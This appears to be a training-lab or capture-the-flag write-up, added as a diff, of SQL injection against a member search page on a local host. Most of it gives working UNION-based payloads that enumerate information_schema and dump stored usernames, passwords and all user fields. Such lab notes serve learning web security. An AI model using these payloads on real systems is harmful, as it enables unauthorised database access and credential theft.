@@ -1,0 +1,78 @@
+http://192.168.1.16/?page=member
+this page allows to search a member by it's id and shows it's last name and surname
+
+assumption: the query is in the form of:
+SELECT ?1, ?2 FROM ?3 WHERE ?4=ARG
+with:
+?1 and ?2 being the column names for first name and surname
+?3 being a table where members are stored
+?4 being the member id column name
+ARG being the provided member id 
+
+objective:
+taking advantage of ARG to inject commands
+
+the command takes 1 parameter and returns 2  fields (shows 3 on result page, 
+	entry parameter is included)
+-> UNION based attacks need to return 2 fields 
+-> in result page the first field will be named as "First Name"
+	and the second as "Surname"
+
+
+################################################################################
+1 UNION SELECT  first_name, last_name FROM users--
+>> obtain list of all members
+random poking around with usual field/table names
+tried id, password, email fields, but column does not exist
+
+
+################################################################################
+1 UNION SELECT table_schema, table_name FROM information_schema.tables--
+>> obtain table names and schema(see dump_01*)
+(table_type and table_catalog do not give interesting info)
+################################################################################
+1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS--
+>> obtain field names from every tables in the db (see dump_02*)
+big dump, was unable to use WHERE clause to limit it due to escaping protections
+
+
+With the database mapped out we can start looking for valuable data.
+
+################################################################################
+1 UNION SELECT id, username FROM Member_Brute_Force.db_default UNION SELECT id, password FROM Member_Brute_Force.db_default--
+>> returns id/username and id/password(see dump_03*)
+since we have to return 2 fields for the union to work we use 2 union in the
+	same request, obtaining the id is not really needed but db_default has
+	only 3 column so might as well
+
+################################################################################
+9 UNION SELECT user_id, first_name FROM users 
+	UNION SELECT user_id, last_name FROM users 
+	UNION SELECT user_id, town FROM users 
+	UNION SELECT user_id, country FROM users 
+	UNION SELECT user_id, planet FROM users 
+	UNION SELECT user_id, Commentaire FROM users 
+	UNION SELECT user_id, countersign FROM users--
+>> dumps all the users table data because why the fuck not(see dump_04*)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+//next
+check tables (from dump02)
+	GLOBAL_VARIABLES fields VARIABLE_NAME, VARIABLE_VALUE
+	USER_STATISTICS
+if able to inject data, try PARAMETERS table (maybe avoid escaping problems by using @)
